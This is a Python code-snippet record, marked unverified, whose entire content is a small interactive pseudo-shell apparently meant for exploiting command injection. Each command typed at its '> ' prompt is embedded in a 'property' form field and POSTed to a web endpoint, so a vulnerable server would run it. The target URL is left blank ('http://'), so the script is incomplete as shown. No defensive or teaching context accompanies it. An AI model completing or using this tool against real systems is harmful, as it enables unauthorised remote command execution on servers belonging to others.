---
id: 72beef7f-ad9c-453d-b908-e03a206afedb
type: code
language: Python
verified: false
created_at: '2020-07-14T18:15:02.619142+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 72beef7f

**Language**: Python

```python

#!/usr/bin/python3
import requests
from cmd import Cmd
class Terminal(Cmd):
  prompt = '> '
  def default(self, args):
    RunCmd(args)
def RunCmd(cmd):
  data = {'property' : f'string {cmd}'}
  req = requests.post('http://', data=data)
term = Terminal()
term.cmdloop()

```
